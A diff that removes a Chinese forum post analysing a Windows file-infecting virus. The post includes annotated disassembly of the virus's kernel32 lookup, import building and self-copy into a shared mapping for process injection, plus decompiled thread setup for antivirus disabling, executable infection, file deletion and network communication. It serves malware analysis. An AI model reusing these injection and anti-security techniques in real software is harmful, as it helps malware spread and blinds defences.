@@ -1,970 +1,1346 @@
 
-
 # 病毒分析
 
 > 原文：[`www.pediy.com/kssd/pediy12/145014.html`](https://www.pediy.com/kssd/pediy12/145014.html)
 
-引用: 开门见山-----非专业人员，不喜勿喷，保持我一份纯真，爱好…..感谢 kris...以及帮助过我的人  
-                         
-  
-  
-1.主体 是由 virus.exe 构成，运行时会开辟一线程，自己 load  upx 壳文件，并运行，所以 我直接将 upx dump 出来，upx 才是真正的核心部分。  
-  
-2.主体会 创建 purty\_control 这个映射文件，并将 自己的  00402316 处的代码 复制到 purty\_control 文件中，让  后面的 upx 进行 远程注入，这段被注入的代码其实就是主体本身，所以 可以达到很强的效果，而且 upx 每次注入都会加载一次 ，upx 每次加载，就会引起强大的效果，可以看后面的 upx 分析，里面有很多线程，包括感染，破坏杀软。  
-  
-  
-3.主体文件中的 purty\_control  ，这个文件中的常数两  比如下文指出 222222,333333 ，这些都是临时的，后面 upx 会自己去 获取系统函数 对这些地方 进行填充  
-  
-  
-4.我这次没有对他到底感染后做什么事情，因为感染的文件太多，我只逆向到，他怎么去感染，感染后干些什么事情  
-  
-  
-5.看 upx 中 ，直接 运行主体到适当时候，进行 dump，时机就是 upx 刚好要执行的时候，这个时候一切就绪，也就是你最好 dump 的效果。  
-  
-6.upx 手动脱壳，最好试试 ，呵呵 这样就比较好的去理解脱壳  
-  
-  
-  
-7.upx 这块主要是 外面几个打线程 ，以及开头对一个 call  
-  
-8.upx 中 有一段 r3 层 获取 keSSdtTable ,进行 hook 的手法，我是第一次见到过，没见过的可以看看，ida 差不多已经还原，我也顺便贴上 了 百度的源码  ps ：不记得是哪个博主的，请原谅  
-  
-9.对杀软的破坏，r0 和 r3 同时进行， 先关 r0 层驱动，后关闭应用层的 进程，关闭不掉的，用自己挂载的驱动进行解决 r3 层的 关闭 以及破坏  
-  
-  
-10.文件的感染，这个方式他很普通，利用 感染模块 ，便利磁盘 对 exe 感染 ，如果有其他 rar 什么的 他就给你先修改属性，然后删除，达到破坏  
-  
-11.通信这一块，具体的网站已经网址下载 ，看 常数段 ，表明很清楚 ，我只看了一些 他是通过三个线程，一个 初始化，一个 接受，一个发送   
-  
-  
-总结： 他达到 主体，和 upx 执行体，分不开 ，主体里可以引起 执行体的生产和运行，upx 执行体的运行，可以引起远程注入各个进程，而注入的代码却是主体生产以及运行 upx 的代码 ......这个病毒比较强大，分析请用慎重。  
-Ps：可以学习到很多 编程方面的技巧，详细 upx 看 idb  
-  
-  
-  
-一开始花指令  
-  
-.text:00401010                   start proc near  
-.text:00401010 E8 00 00 00 00    call    $+5  
-.text:00401015 5E                pop     esi  
-.text:00401016 0F 6E E6          movd    mm4, esi  
-.text:00401019 0F 7E E2          movd    edx, mm4  
-.text:0040101C 81 C2 54 02 00 00 add     edx, 254h  
-.text:00401022 52                push    edx  
-.text:00401023 BB 66 5A 7B 48    mov     ebx, 487B5A66h  
-.text:00401028 C3                retn          ;eip 401269  
-  
-  
-  
-  
-后面有很多处理：我没有管，直接找 ret 的地方，才真正到达我们分析的地方  
-00401D10   .  C3                                    RETN  
-  
-  
-  
-00402316    E8 00000000                             CALL 0040231B  
-0040231B    5D                                      POP EBP  
-0040231C    8BC5                                    MOV EAX,EBP  
-0040231E    81ED 05104000                           SUB EBP,00401005                                      ; 重定位  之所以重定位，是因为他将是 被注入到所有进程的代码  
-00402324    8A9D 73274000                           MOV BL,BYTE PTR SS:\[EBP+402773\]                       ; 1  
-0040232A    84DB                                    TEST BL,BL  
-0040232C    74 13                                   JE SHORT 00402341  
-0040232E    81C4 24000000                           ADD ESP,24  
-00402334    2D 0B130000                             SUB EAX,130B  
-00402339    8985 54124000                           MOV DWORD PTR SS:\[EBP+401254\],EAX                     ; 入口地址 00401010  
-0040233F    EB 19                                   JMP SHORT 0040235A  
-00402341    C785 4D144000 22222222                  MOV DWORD PTR SS:\[EBP+40144D\],22222222  
-0040234B    C785 3A144000 33333333                  MOV DWORD PTR SS:\[EBP+40143A\],33333333  
-00402355    E9 82000000                             JMP 004023DC  ；对上面的常数 2222222,333333 ，只是占位，后面会在注入前填充真正地址  
-  
-  
-  
-  
-  
-0040235A    33DB                                    XOR EBX,EBX  
-0040235C    64:67:8B1E 3000                         MOV EBX,DWORD PTR FS:\[30\]                ; peb  
-00402362    85DB                                    TEST EBX,EBX  
-00402364    78 0E                                   JS SHORT 00402374  
-00402366    8B5B 0C                                 MOV EBX,DWORD PTR DS:\[EBX+C\]             ; InLoadOrderModuleList  
-00402369    8B5B 1C                                 MOV EBX,DWORD PTR DS:\[EBX+1C\]            ; entryPoint  
-0040236C    8B1B                                    MOV EBX,DWORD PTR DS:\[EBX\]               ; Flink  
-0040236E    8B5B 08                                 MOV EBX,DWORD PTR DS:\[EBX+8\]             ; kernel.基地址  
-00402371    F8                                      CLC  
-00402372    EB 0A                                   JMP SHORT 0040237E  
-00402374    8B5B 34                                 MOV EBX,DWORD PTR DS:\[EBX+34\]  
-00402377    8D5B 7C                                 LEA EBX,DWORD PTR DS:\[EBX+7C\]  
-0040237A    8B5B 3C                                 MOV EBX,DWORD PTR DS:\[EBX+3C\]  
-0040237D    F8                                      CLC  
-0040237E    66:813B 4D5A                            CMP WORD PTR DS:\[EBX\],5A4D               ; kernel  
-00402383    74 05                                   JE SHORT 0040238A  
-00402385    E9 46010000                             JMP 004024D0  
-0040238A    8BF3                                    MOV ESI,EBX  
-0040238C    0376 3C                                 ADD ESI,DWORD PTR DS:\[ESI+3C\]            ; 地址  Pe  
-0040238F    813E 50450000                           CMP DWORD PTR DS:\[ESI\],4550              ; esi  == PE\_NtHeader  
-00402395    74 05                                   JE SHORT 0040239C  
-00402397    E9 34010000                             JMP 004024D0  
-0040239C    899D 22144000                           MOV DWORD PTR SS:\[EBP+401422\],EBX        ; kernel 基地址  
-004023A2    8D85 3E144000                           LEA EAX,DWORD PTR SS:\[EBP+40143E\]  
-004023A8    50                                      PUSH EAX                                 ; loadlibrary  
-004023A9    FFB5 22144000                           PUSH DWORD PTR SS:\[EBP+401422\]           ; kernelＢａｓｅ  
-004023AF    E8 E8010000                             CALL 0040259C                            ; ＧｅｔＰｒｏｃＡｄｄｒｅｓｓ  
-004023B4    E8 BD010000                             CALL 00402576                            ; ｒｅｔ  
-004023B9    8985 4D144000                           MOV DWORD PTR SS:\[EBP+40144D\],EAX        ; EAX=7C801D4F (kernel32.LoadLibraryExA)  
-004023BF    8D85 2B144000                           LEA EAX,DWORD PTR SS:\[EBP+40142B\]  
-004023C5    50                                      PUSH EAX  
-004023C6    FFB5 22144000                           PUSH DWORD PTR SS:\[EBP+401422\]  
-004023CC    E8 CB010000                             CALL 0040259C  
-004023D1    E8 A0010000                             CALL 00402576  
-004023D6    8985 3A144000                           MOV DWORD PTR SS:\[EBP+40143A\],EAX        ; EAX=7C80AC28 (kernel32.GetProcAddress)  
-004023DC    8D85 82164000                           LEA EAX,DWORD PTR SS:\[EBP+401682\]        ; 地址=00402998, (ASCII "KERNEL32.DLL")  
-004023E2    6A 00                                   PUSH 0  
-004023E4    6A 00                                   PUSH 0  
-004023E6    50                                      PUSH EAX  
-004023E7    FF95 4D144000                           CALL DWORD PTR SS:\[EBP+40144D\]  
-004023ED    E8 84010000                             CALL 00402576  
-004023F2    8985 22144000                           MOV DWORD PTR SS:\[EBP+401422\],EAX        ; EAX=7C800000 (kernel32.7C800000)  
-004023F8    8DBD 51144000                           LEA EDI,DWORD PTR SS:\[EBP+401451\]        ; 地址=00402767, (ASCII "CloseHandle")  
-004023FE    8B95 22144000                           MOV EDX,DWORD PTR SS:\[EBP+401422\]        ; SS:\[00402738\]=7C800000 (kernel32.7C800000)  
-00402404    E8 72010000                             CALL 0040257B                            ; Iat 构建  
-  
-  
-  
-  
-    \_\_Proc 0040257B      
-0040257B    8BF7                                    MOV ESI,EDI  
-0040257D    32C0                                    XOR AL,AL  
-0040257F    AE                                      SCAS BYTE PTR ES:\[EDI\]  
-00402580  ^ 75 FD                                   JNZ SHORT 0040257F                       ; 字符串末尾定位地址存放处  
-00402582    52                                      PUSH EDX                                 ; EDX=7C800000 (kernel32.7C800000)  
-00402583    56                                      PUSH ESI                                 ; ESI=00402767 (virus.00402767), ASCII "CloseHandle"  
-00402584    52                                      PUSH EDX                                 ; EDX=7C800000 (kernel32.7C800000)  
-00402585    FF95 3A144000                           CALL DWORD PTR SS:\[EBP+40143A\]  
-0040258B    E8 E6FFFFFF                             CALL 00402576  
-00402590    8907                                    MOV DWORD PTR DS:\[EDI\],EAX               ; 构建ｉａｔ  
-00402592    5A                                      POP EDX  
-00402593    83C7 04                                 ADD EDI,4  
-00402596    803F FF                                 CMP BYTE PTR DS:\[EDI\],0FF  
-00402599  ^ 75 E0                                   JNZ SHORT 0040257B  
-0040259B    C3                                      RETN  
-  
-  
-00402409    68 02800000                             PUSH 8002  
-0040240E    FF95 A7144000                           CALL DWORD PTR SS:\[EBP+4014A7\]                        ; SetErrorCOde  
-00402414    8DBD 60164000                           LEA EDI,DWORD PTR SS:\[EBP+401660\]                     ; 地址=00402976, (ASCII "hh8geqpHJTkdns6")  
-0040241A    57                                      PUSH EDI  
-0040241B    68 00800000                             PUSH 8000  
-00402420    33C0                                    XOR EAX,EAX  
-00402422    50                                      PUSH EAX  
-00402423    6A 04                                   PUSH 4  
-00402425    50                                      PUSH EAX  
-00402426    48                                      DEC EAX  
-00402427    50                                      PUSH EAX  
-00402428    FF95 74144000                           CALL DWORD PTR SS:\[EBP+401474\]  
-0040242E    8DBD 4C164000                           LEA EDI,DWORD PTR SS:\[EBP+40164C\]  
-00402434    57                                      PUSH EDI                                              ; 地址=00402962, (ASCII "purity\_control\_7728")  
-00402435    68 00540100                             PUSH 15400  
-0040243A    6A 00                                   PUSH 0  
-0040243C    6A 04                                   PUSH 4  
-0040243E    6A 00                                   PUSH 0  
-00402440    6A FF                                   PUSH -1  
-00402442    FF95 74144000                           CALL DWORD PTR SS:\[EBP+401474\]                        ; SS:\[0040278A\]=7C80946C (kernel32.CreateFileMappingA)  
-00402448    85C0                                    TEST EAX,EAX                                          ; 20h 句柄  
-0040244A    74 3A                                   JE SHORT 00402486                                     ; 为空表明失败  
-0040244C    68 00540100                             PUSH 15400  
-00402451    6A 00                                   PUSH 0  
-00402453    6A 00                                   PUSH 0  
-00402455    6A 06                                   PUSH 6  
-00402457    50                                      PUSH EAX  
-00402458    FF95 F9144000                           CALL DWORD PTR SS:\[EBP+4014F9\]                        ; SS:\[0040280F\]=7C80B78D (kernel32.MapViewOfFile)  
-0040245E    85C0                                    TEST EAX,EAX                                          ; 00380000  pvoidFile  
-00402460    74 24                                   JE SHORT 00402486  
-00402462    8985 8F164000                           MOV DWORD PTR SS:\[EBP+40168F\],EAX                     ; pFilePury\_control  
-00402468    80BD 73274000 01                        CMP BYTE PTR SS:\[EBP+402773\],1                        ; 全局标志符号 初始为 1  
-0040246F    75 15                                   JNZ SHORT 00402486  
-00402471    B9 ECE80000                             MOV ECX,0E8EC  
-00402476    8DB5 00104000                           LEA ESI,DWORD PTR SS:\[EBP+<&KERNEL32.Sleep>\]  
-0040247C    8BF8                                    MOV EDI,EAX                                           ; pFilePury\_control  
-0040247E    8B06                                    MOV EAX,DWORD PTR DS:\[ESI\]                            ; DS:\[00402316\]=000000E8  
-00402480    3907                                    CMP DWORD PTR DS:\[EDI\],EAX  
-00402482    74 02                                   JE SHORT 00402486  
-00402484    F3:A4                                   REP MOVS BYTE PTR ES:\[EDI\],BYTE PTR DS:\[ESI\]          ; 复制指令 由本代码 00402316 开始 复制 e8ec 字节 代码到 pFilePury\_control 镜像文件中去  esi = 38e8ec  ;也就是本页面的代码 就是这个 Pe 的主题线程代码  
-00402486    8D85 93164000                           LEA EAX,DWORD PTR SS:\[EBP+401693\]  
-0040248C    50                                      PUSH EAX                                              ; 地址=004029A9  
-0040248D    6A 00                                   PUSH 0  
-0040248F    89AD 93164000                           MOV DWORD PTR SS:\[EBP+401693\],EBP                     ; 重定位差值  
-00402495    FFB5 93164000                           PUSH DWORD PTR SS:\[EBP+401693\]                        ; 1316  
-0040249B    8D85 D1164000                           LEA EAX,DWORD PTR SS:\[EBP+4016D1\]  
-004024A1    50                                      PUSH EAX                                              ; EAX=004029E7 (virus.004029E7)  ThreadProc  
-004024A2    6A 00                                   PUSH 0  
-004024A4    6A 00                                   PUSH 0  
-004024A6    FF95 96144000                           CALL DWORD PTR SS:\[EBP+401496\]                        ; SS:\[004027AC\]=7C81082F (kernel32.CreateThread)  
-004024AC    80BD 73274000 00                        CMP BYTE PTR SS:\[EBP+402773\],0  
-004024B3    75 0A                                   JNZ SHORT 004024BF  
-004024B5    6A FF                                   PUSH -1  
-004024B7    FF95 03154000                           CALL DWORD PTR SS:\[EBP+401503\]  
-004024BD  ^ EB ED                                   JMP SHORT 004024AC  
-004024BF    6A 0C                                   PUSH 0C  
-004024C1    FF95 03154000                           CALL DWORD PTR SS:\[EBP+401503\]                        ; SS:\[00402819\]=7C802442 (kernel32.Sleep) 转换线程  
-004024C7    83BD C9164000 01                        CMP DWORD PTR SS:\[EBP+4016C9\],1  
-004024CE  ^ 75 DC                                   JNZ SHORT 004024AC                                    ; 通过标志通信是否完全处理好线程工作  
-004024D0    83BD 74274000 01                        CMP DWORD PTR SS:\[EBP+402774\],1  
-004024D7    0F85 8C000000                           JNZ 00402569  
-  
-  
-  
-  
-  
-  
-    \_\_\_\_ThreadProc 处理手动 loader upx 程序 并执行，我们直接弄出来  
-004029E7    C8 000000                               ENTER 0,0                                             ; ThreadProc Parameter 1316  
-004029EB    8B6D 08                                 MOV EBP,DWORD PTR SS:\[EBP+8\]                          ; 1316  
-004029EE    80BD 73274000 01                        CMP BYTE PTR SS:\[EBP+402773\],1                        ; 重定位 需要 懂了吧~~~  Ps:此处一看就是标志作用，里应外合  
-004029F5    0F85 FB000000                           JNZ 00402AF6  
-004029FB    8B8D 74274000                           MOV ECX,DWORD PTR SS:\[EBP+402774\]                     ; 改变标志  
-00402A01    49                                      DEC ECX  
-00402A02    85C9                                    TEST ECX,ECX  
-00402A04    74 0F                                   JE SHORT 00402A15  
-00402A06    41                                      INC ECX  
-00402A07    8DB5 78274000                           LEA ESI,DWORD PTR SS:\[EBP+402778\]  
-00402A0D    8BBD 54124000                           MOV EDI,DWORD PTR SS:\[EBP+401254\]  
-00402A13    F3:A4                                   REP MOVS BYTE PTR ES:\[EDI\],BYTE PTR DS:\[ESI\]  
-00402A15    89AD 411E4000                           MOV DWORD PTR SS:\[EBP+401E41\],EBP                     ; 60 bd  
-00402A1B    89AD 341D4000                           MOV DWORD PTR SS:\[EBP+401D34\],EBP  
-00402A21    89AD 0F1E4000                           MOV DWORD PTR SS:\[EBP+401E0F\],EBP  
-00402A27    89AD 731E4000                           MOV DWORD PTR SS:\[EBP+401E73\],EBP  
-00402A2D    89AD DD1D4000                           MOV DWORD PTR SS:\[EBP+401DDD\],EBP  
-00402A33    8D85 78274000                           LEA EAX,DWORD PTR SS:\[EBP+402778\]                     ; 地址=00403A8E : 路径 C:\\....\\virus.exe  
-00402A39    68 FE010000                             PUSH 1FE  
-00402A3E    50                                      PUSH EAX                                              ; EAX=00403A8E (virus.00403A8E)  
-00402A3F    6A 00                                   PUSH 0  
-00402A41    FF95 1A154000                           CALL DWORD PTR SS:\[EBP+40151A\]                        ; GetModuleFile  
-00402A47    85C0                                    TEST EAX,EAX                                          ; 00000036: length Path  
-00402A49    74 2E                                   JE SHORT 00402A79  
-00402A4B    8BC8                                    MOV ECX,EAX  
-00402A4D    48                                      DEC EAX  
-00402A4E    83BC05 78274000 00                      CMP DWORD PTR SS:\[EBP+EAX+402778\],0  
-00402A56    74 10                                   JE SHORT 00402A68  
-00402A58    80BC05 78274000 5C                      CMP BYTE PTR SS:\[EBP+EAX+402778\],5C  
-00402A60    75 03                                   JNZ SHORT 00402A65  
-00402A62    40                                      INC EAX  
-00402A63    EB 03                                   JMP SHORT 00402A68  
-00402A65    48                                      DEC EAX                                               ; 一直得到 名字的第一位 Index  
-00402A66  ^ EB E6                                   JMP SHORT 00402A4E  
-00402A68    8DBD DA1F4000                           LEA EDI,DWORD PTR SS:\[EBP+401FDA\]                     ; 地址=004032F0 可能为一块缓冲区  
-00402A6E    8DB405 78274000                         LEA ESI,DWORD PTR SS:\[EBP+EAX+402778\]                 ; 得到名字 ：地址=00403ABB, (ASCII "virus.exe")  
-00402A75    2BC8                                    SUB ECX,EAX  
-00402A77    F3:A4                                   REP MOVS BYTE PTR ES:\[EDI\],BYTE PTR DS:\[ESI\]          ; 复制名字 到 004032f0  
-00402A79    8BBD 54124000                           MOV EDI,DWORD PTR SS:\[EBP+401254\]                     ; SS:\[0040256A\]=00401010 (virus.<ModuleEntryPoint>)  
-00402A7F    2BBD 37234000                           SUB EDI,DWORD PTR SS:\[EBP+402337\]  
-00402A85    89BD CD164000                           MOV DWORD PTR SS:\[EBP+4016CD\],EDI                     ; edi: 装载基地址 MyBaseAddrEDI=00400000 (virus.00400000)  
-00402A8B    33C9                                    XOR ECX,ECX  
-00402A8D    B1 05                                   MOV CL,5  
-00402A8F    8D95 3B234000                           LEA EDX,DWORD PTR SS:\[EBP+40233B\]                     ; 地址=00403651  
-00402A95    80F9 05                                 CMP CL,5  
-00402A98    75 06                                   JNZ SHORT 00402AA0  
-00402A9A    8DB5 DB1D4000                           LEA ESI,DWORD PTR SS:\[EBP+401DDB\]                     ; 地址=004030F1  
-00402AA0    80F9 04                                 CMP CL,4  
-00402AA3    75 06                                   JNZ SHORT 00402AAB  
-00402AA5    8DB5 711E4000                           LEA ESI,DWORD PTR SS:\[EBP+401E71\]                     ; 00403187  
-00402AAB    80F9 03                                 CMP CL,3  
-00402AAE    75 06                                   JNZ SHORT 00402AB6  
-00402AB0    8DB5 3F1E4000                           LEA ESI,DWORD PTR SS:\[EBP+401E3F\]                     ; 地址=00403155  
-00402AB6    80F9 02                                 CMP CL,2  
-00402AB9    75 06                                   JNZ SHORT 00402AC1  
-00402ABB    8DB5 311D4000                           LEA ESI,DWORD PTR SS:\[EBP+401D31\]                     ; 地址=00403047  
-00402AC1    80F9 01                                 CMP CL,1  
-00402AC4    75 06                                   JNZ SHORT 00402ACC  
-00402AC6    8DB5 0D1E4000                           LEA ESI,DWORD PTR SS:\[EBP+401E0D\]                     ; 地址=00403123  
-00402ACC    33DB                                    XOR EBX,EBX  
-00402ACE    B3 04                                   MOV BL,4  
-00402AD0    8B02                                    MOV EAX,DWORD PTR DS:\[EDX\]                            ; DS:\[00403651\]=00000000  
-00402AD2    85C0                                    TEST EAX,EAX  
-00402AD4    74 04                                   JE SHORT 00402ADA  
-00402AD6    03C7                                    ADD EAX,EDI  
-00402AD8    8930                                    MOV DWORD PTR DS:\[EAX\],ESI  
-00402ADA    83C2 04                                 ADD EDX,4  
-00402ADD    4B                                      DEC EBX  
-00402ADE    85DB                                    TEST EBX,EBX  
-00402AE0    74 02                                   JE SHORT 00402AE4  
-00402AE2  ^ EB EC                                   JMP SHORT 00402AD0                                    ; 循环 4 次  测试是否为 0  不为 0 填充 esi 数据  
-00402AE4    49                                      DEC ECX  
-00402AE5    85C9                                    TEST ECX,ECX  
-00402AE7    74 02                                   JE SHORT 00402AEB  
-00402AE9  ^ EB AA                                   JMP SHORT 00402A95  
-00402AEB    B8 01000000                             MOV EAX,1  
-00402AF0    8985 C9164000                           MOV DWORD PTR SS:\[EBP+4016C9\],EAX                     ; 标记  
-00402AF6    8D85 70164000                           LEA EAX,DWORD PTR SS:\[EBP+401670\]  
-00402AFC    50                                      PUSH EAX                                              ; 地址=00402986, (ASCII "uxJLpe1m")  
-00402AFD    6A 00                                   PUSH 0  
-00402AFF    6A 00                                   PUSH 0  
-00402B01    FF95 85144000                           CALL DWORD PTR SS:\[EBP+401485\]                        ; SS:\[0040279B\]=7C80EB3F (kernel32.CreateMutexA)  
-00402B07    50                                      PUSH EAX  
-00402B08    8985 C5164000                           MOV DWORD PTR SS:\[EBP+4016C5\],EAX                     ; hMutex:28h  
-00402B0E    FF95 E7144000                           CALL DWORD PTR SS:\[EBP+4014E7\]  
-00402B14    83F8 00                                 CMP EAX,0                                             ; 保持一个实例运行  
-00402B17    76 13                                   JBE SHORT 00402B2C  
-00402B19    FF95 5D144000                           CALL DWORD PTR SS:\[EBP+40145D\]  
-00402B1F    68 10270000                             PUSH 2710  
-00402B24    FF95 03154000                           CALL DWORD PTR SS:\[EBP+401503\]  
-00402B2A  ^ EB CA                                   JMP SHORT 00402AF6  
-00402B2C    58                                      POP EAX                                               ; hMutex  
-00402B2D    8D95 EC444000                           LEA EDX,DWORD PTR SS:\[EBP+4044EC\]                     ; 地址=00405802  Pe 格式的文件  
-00402B33    80BD 73274000 00                        CMP BYTE PTR SS:\[EBP+402773\],0                        ; 标志 首次运行为 1  
-00402B3A    75 0C                                   JNZ SHORT 00402B48  
-00402B3C    8B95 8F164000                           MOV EDX,DWORD PTR SS:\[EBP+40168F\]  
-00402B42    81C2 EC340000                           ADD EDX,34EC  
-00402B48    66:813A 4D5A                            CMP WORD PTR DS:\[EDX\],5A4D  
-00402B4D    0F85 54020000                           JNZ 00402DA7  
-00402B53    8B42 3C                                 MOV EAX,DWORD PTR DS:\[EDX+3C\]  
-00402B56    03D0                                    ADD EDX,EAX  
-00402B58    66:813A 5045                            CMP WORD PTR DS:\[EDX\],4550  
-00402B5D    0F85 44020000                           JNZ 00402DA7  
-00402B63    8995 93164000                           MOV DWORD PTR SS:\[EBP+401693\],EDX                     ; PE\_Nt\_header:EDX=004058DA (virus.004058DA), ASCII "PE" 看数据 是 upx 壳文件，由于之前做了一部分加密，所以现在可以提取试试  
-00402B69    81C2 F8000000                           ADD EDX,0F8                                           ; PE\_header + f8h :upx0  
-00402B6F    8B85 93164000                           MOV EAX,DWORD PTR SS:\[EBP+401693\]  
-00402B75    8B40 34                                 MOV EAX,DWORD PTR DS:\[EAX+34\]                         ; ImageBase:DS:\[0040590E\]=00400000 (virus.00400000)  
-00402B78    8985 9B164000                           MOV DWORD PTR SS:\[EBP+40169B\],EAX                     ; ImageBase:DS:\[0040590E\]=00400000 (virus.00400000)  
-00402B7E    8B85 93164000                           MOV EAX,DWORD PTR SS:\[EBP+401693\]  
-00402B84    66:8B40 06                              MOV AX,WORD PTR DS:\[EAX+6\]                            ; NumberOfSection :003  
-00402B88    25 FFFF0000                             AND EAX,0FFFF                                         ; 清除高位  
-00402B8D    8985 A3164000                           MOV DWORD PTR SS:\[EBP+4016A3\],EAX                     ; NumberOfSection :003  
-00402B93    8B85 93164000                           MOV EAX,DWORD PTR SS:\[EBP+401693\]  
-00402B99    8B40 50                                 MOV EAX,DWORD PTR DS:\[EAX+50\]                         ; sizeOfImage:DS:\[0040592A\]=000B9000  
-00402B9C    05 00010000                             ADD EAX,100  
-00402BA1    6A 40                                   PUSH 40  
-00402BA3    68 00300000                             PUSH 3000  
-00402BA8    05 00000001                             ADD EAX,1000000  
-00402BAD    50                                      PUSH EAX                                              ; EAX=010B9100  
-00402BAE    6A 00                                   PUSH 0  
-00402BB0    FF95 B8144000                           CALL DWORD PTR SS:\[EBP+4014B8\]                        ; SS:\[004027CE\]=7C809A81 (kernel32.VirtualAlloc)  
-00402BB6    85C0                                    TEST EAX,EAX  
-00402BB8    0F84 E9010000                           JE 00402DA7  
-00402BBE    8985 97164000                           MOV DWORD PTR SS:\[EBP+401697\],EAX                     ; EAX=00520000  
-00402BC4    B9 00B40000                             MOV ECX,0B400  
-00402BC9    8DB5 EC444000                           LEA ESI,DWORD PTR SS:\[EBP+4044EC\]  
-00402BCF    80BD 73274000 00                        CMP BYTE PTR SS:\[EBP+402773\],0  
-00402BD6    75 0C                                   JNZ SHORT 00402BE4  
-00402BD8    8BB5 8F164000                           MOV ESI,DWORD PTR SS:\[EBP+40168F\]  
-00402BDE    81C6 EC340000                           ADD ESI,34EC  
-00402BE4    8BBD 97164000                           MOV EDI,DWORD PTR SS:\[EBP+401697\]  
-00402BEA    F3:A4                                   REP MOVS BYTE PTR ES:\[EDI\],BYTE PTR DS:\[ESI\]          ; 复制 pe 文件 前面部分  
-00402BEC    FF8D A3164000                           DEC DWORD PTR SS:\[EBP+4016A3\]                         ; 处理块区  
-00402BF2    8B95 93164000                           MOV EDX,DWORD PTR SS:\[EBP+401693\]  
-00402BF8    81C2 F8000000                           ADD EDX,0F8  
-00402BFE    52                                      PUSH EDX  
-00402BFF    8B85 A3164000                           MOV EAX,DWORD PTR SS:\[EBP+4016A3\]  
-00402C05    BB 28000000                             MOV EBX,28  
-00402C0A    F7E3                                    MUL EBX  
-00402C0C    5A                                      POP EDX  
-00402C0D    03D0                                    ADD EDX,EAX  
-00402C0F    8B42 08                                 MOV EAX,DWORD PTR DS:\[EDX+8\]  
-00402C12    8985 A7164000                           MOV DWORD PTR SS:\[EBP+4016A7\],EAX  
-00402C18    8B42 0C                                 MOV EAX,DWORD PTR DS:\[EDX+C\]  
-00402C1B    8985 AB164000                           MOV DWORD PTR SS:\[EBP+4016AB\],EAX  
-00402C21    8B42 10                                 MOV EAX,DWORD PTR DS:\[EDX+10\]  
-00402C24    8985 AF164000                           MOV DWORD PTR SS:\[EBP+4016AF\],EAX  
-00402C2A    8D85 EC444000                           LEA EAX,DWORD PTR SS:\[EBP+4044EC\]  
-00402C30    80BD 73274000 00                        CMP BYTE PTR SS:\[EBP+402773\],0  
-00402C37    75 0B                                   JNZ SHORT 00402C44  
-00402C39    8B85 8F164000                           MOV EAX,DWORD PTR SS:\[EBP+40168F\]  
-00402C3F    05 EC340000                             ADD EAX,34EC  
-00402C44    0342 14                                 ADD EAX,DWORD PTR DS:\[EDX+14\]  
-00402C47    8985 B3164000                           MOV DWORD PTR SS:\[EBP+4016B3\],EAX  
-00402C4D    8BB5 B3164000                           MOV ESI,DWORD PTR SS:\[EBP+4016B3\]  
-00402C53    8BBD AB164000                           MOV EDI,DWORD PTR SS:\[EBP+4016AB\]  
-00402C59    03BD 97164000                           ADD EDI,DWORD PTR SS:\[EBP+401697\]  
-00402C5F    8B8D AF164000                           MOV ECX,DWORD PTR SS:\[EBP+4016AF\]  
-00402C65    F3:A4                                   REP MOVS BYTE PTR ES:\[EDI\],BYTE PTR DS:\[ESI\]          ; 复制过去  
-00402C67    83BD A3164000 00                        CMP DWORD PTR SS:\[EBP+4016A3\],0  
-00402C6E  ^ 0F85 78FFFFFF                           JNZ 00402BEC                                          ; 以上是装载块区  
-00402C74    8B85 93164000                           MOV EAX,DWORD PTR SS:\[EBP+401693\]  
-00402C7A    8B80 A0000000                           MOV EAX,DWORD PTR DS:\[EAX+A0\]                         ; 第一块的地址 rva  upx0， 到这里我们就可以直接把文件 从内存里 dump 出来，直接分析关键  
-00402C80    85DB                                    TEST EBX,EBX  
-00402C82    74 6D                                   JE SHORT 00402CF1  
-00402C84    0385 97164000                           ADD EAX,DWORD PTR SS:\[EBP+401697\]                     ; SS:\[004029AD\]=00520000 装载后的 pe   只想 upx0 第一块  
-00402C8A    8985 9F164000                           MOV DWORD PTR SS:\[EBP+40169F\],EAX  
-00402C90    8B85 97164000                           MOV EAX,DWORD PTR SS:\[EBP+401697\]  
-00402C96    8BD0                                    MOV EDX,EAX                                           ; EAX=00520000  
-00402C98    8BD8                                    MOV EBX,EAX                                           ; EAX=00520000  
-00402C9A    2B95 9B164000                           SUB EDX,DWORD PTR SS:\[EBP+40169B\]                     ; 重定位特征  
-....后面是真正的动作，我们看 upx ...  
-  
-  
-  
-  
-  
-\---upx 脱壳 ，继续调试，手脱部分就不写了。太多了  
-  
-  
-先看整体部分：  
-SetErrorMode(0x8002u);  
-  WSAStartup(2u, &WSAData);  
-  InitializeCriticalSection(&CriticalSection);  
-  InitializeCriticalSection(&struCriticalSection1);  
-  InitializeCriticalSection(&struCriticalSection2);  
-  hiewOpenAndPrevent(v0);  
-  v1 = CreateThread(0, 0, (LPTHREAD\_START\_ROUTINE)productInjectCodeAndInjectEvery, 0, 0, &ThreadId);  
-  WaitObject(v1, 0, 0);  
-  v2 = CreateThread(0, 0, (LPTHREAD\_START\_ROUTINE)FuckSaftySoftInR0AndR3, 0, 0, &ThreadId);  
-  WaitObject(v2, 0, 0);  
-  v3 = CreateThread(0, 0, (LPTHREAD\_START\_ROUTINE)genericPeFileAndInfect, 0, 0, &ThreadId);  
-  WaitObject(v3, 0, 0);  
-  v4 = CreateThread(0, 0, (LPTHREAD\_START\_ROUTINE)genericPeFileByBufferBeforeAndDelete, 0, 0, &ThreadId);  
-  WaitObject(v4, 0, 0);  
-  v5 = CreateThread(0, 0, (LPTHREAD\_START\_ROUTINE)recycleAndInjectExeAndDeletedir, 0, 0, &ThreadId);  
-  WaitObject(v5, 0, 0);  
-  v6 = CreateThread(0, 0, (LPTHREAD\_START\_ROUTINE)waitObjectRecycle, 0, 0, &ThreadId);  
-  WaitObject(v6, 0, 0);  
-  v7 = CreateThread(0, 0, (LPTHREAD\_START\_ROUTINE)netCommunicatestart, 0, 0, &ThreadId);  
-  WaitObject(v7, 0, 0);  
-  v8 = CreateThread(0, 0, (LPTHREAD\_START\_ROUTINE)SendbySocket, 0, 0, &ThreadId);  
-  WaitObject(v8, 0, 0);  
-  v9 = CreateThread(0, 0, (LPTHREAD\_START\_ROUTINE)getData, 0, 0, &ThreadId);// 后面三个是网络传输线程配合  
-  WaitObject(v9, 0, 0);  
-  while ( 1 )  
-    Sleep(0x200u);  
-}  
-  
-  
-  
-  
-我整理了一下 只看重点：具体就看 ida （自认为注释的差不多有的可以还原了）  
-      --1.hiewOpenAndPrevent  关于服务的开启禁止 以及文件唯一随即命名的方式  
